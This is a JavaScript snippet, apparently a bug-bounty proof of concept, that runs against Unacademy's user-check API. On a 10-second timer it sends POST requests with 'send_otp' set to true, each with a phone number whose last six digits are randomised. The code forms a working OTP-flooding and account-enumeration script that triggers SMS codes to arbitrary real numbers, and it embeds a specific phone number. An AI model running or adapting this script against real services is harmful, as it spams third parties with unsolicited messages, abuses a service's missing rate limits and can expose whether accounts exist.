const interval = setInterval(() => {
    const id = Math.floor(Math.random() * 900000) + 100000;
    const payloadData =
        '{"phone":"7620153215","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}';
    let jsonObject = JSON.parse(payloadData);
    const currentPhoneNumber = jsonObject.phone;
    const newPhoneNumber = currentPhoneNumber.slice(0, -6) + id;
    jsonObject.phone = newPhoneNumber;
    const updatedJson = JSON.stringify(jsonObject);
    fetch(
        "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
        {
            headers: {
                accept: "*/*",
                "accept-language":
                    "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,mr;q=0.6",
                "content-type": "application/json",
                "sec-ch-ua":
                    '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-platform": "0",
                "X-Hackerone": "kiranjadhav45",
            },
            referrer: "https://unacademy.com/",
            referrerPolicy: "strict-origin-when-cross-origin",
            body: updatedJson,
            method: "POST",
            mode: "cors",
            credentials: "include",
        }
    );
}, 10000);